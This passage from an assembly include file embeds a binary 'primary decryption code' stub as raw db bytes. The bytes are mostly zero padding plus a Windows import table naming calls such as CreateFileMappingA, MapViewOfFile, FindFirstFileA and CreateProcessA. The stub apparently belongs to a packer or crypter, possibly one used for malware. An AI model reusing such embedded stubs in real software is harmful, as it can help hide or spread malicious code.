                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x35,0x30,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x28,0x30,0x00,0x00
                                db 0x69,0x30,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x4B,0x45,0x52,0x4E,0x45,0x4C,0x33,0x32
                                db 0x2E,0x44,0x4C,0x4C,0x00,0x9D,0x30,0x00,0x00,0xAB,0x30,0x00,0x00,0xB9,0x30,0x00
                                db 0x00,0xCE,0x30,0x00,0x00,0xDF,0x30,0x00,0x00,0xED,0x30,0x00,0x00,0xF9,0x30,0x00
                                db 0x00,0x0A,0x31,0x00,0x00,0x18,0x31,0x00,0x00,0x28,0x31,0x00,0x00,0x3A,0x31,0x00
                                db 0x00,0x49,0x31,0x00,0x00,0x00,0x00,0x00,0x00,0x9D,0x30,0x00,0x00,0xAB,0x30,0x00
                                db 0x00,0xB9,0x30,0x00,0x00,0xCE,0x30,0x00,0x00,0xDF,0x30,0x00,0x00,0xED,0x30,0x00
                                db 0x00,0xF9,0x30,0x00,0x00,0x0A,0x31,0x00,0x00,0x18,0x31,0x00,0x00,0x28,0x31,0x00
                                db 0x00,0x3A,0x31,0x00,0x00,0x49,0x31,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x43
                                db 0x6C,0x6F,0x73,0x65,0x48,0x61,0x6E,0x64,0x6C,0x65,0x00,0x00,0x00,0x43,0x72,0x65
                                db 0x61,0x74,0x65,0x46,0x69,0x6C,0x65,0x41,0x00,0x00,0x00,0x43,0x72,0x65,0x61,0x74
                                db 0x65,0x46,0x69,0x6C,0x65,0x4D,0x61,0x70,0x70,0x69,0x6E,0x67,0x41,0x00,0x00,0x00
                                db 0x43,0x72,0x65,0x61,0x74,0x65,0x50,0x72,0x6F,0x63,0x65,0x73,0x73,0x41,0x00,0x00
                                db 0x00,0x45,0x78,0x69,0x74,0x50,0x72,0x6F,0x63,0x65,0x73,0x73,0x00,0x00,0x00,0x46
                                db 0x69,0x6E,0x64,0x43,0x6C,0x6F,0x73,0x65,0x00,0x00,0x00,0x46,0x69,0x6E,0x64,0x46
                                db 0x69,0x72,0x73,0x74,0x46,0x69,0x6C,0x65,0x41,0x00,0x00,0x00,0x47,0x65,0x74,0x46
                                db 0x69,0x6C,0x65,0x53,0x69,0x7A,0x65,0x00,0x00,0x00,0x4D,0x61,0x70,0x56,0x69,0x65
                                db 0x77,0x4F,0x66,0x46,0x69,0x6C,0x65,0x00,0x00,0x00,0x55,0x6E,0x6D,0x61,0x70,0x56
                                db 0x69,0x65,0x77,0x4F,0x66,0x46,0x69,0x6C,0x65,0x00,0x00,0x00,0x56,0x69,0x72,0x74
                                db 0x75,0x61,0x6C,0x41,0x6C,0x6C,0x6F,0x63,0x00,0x00,0x00,0x57,0x72,0x69,0x74,0x65
                                db 0x46,0x69,0x6C,0x65,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
primary_decryption_code_end:
####################################[prime_decrypt_bin.inc]###################################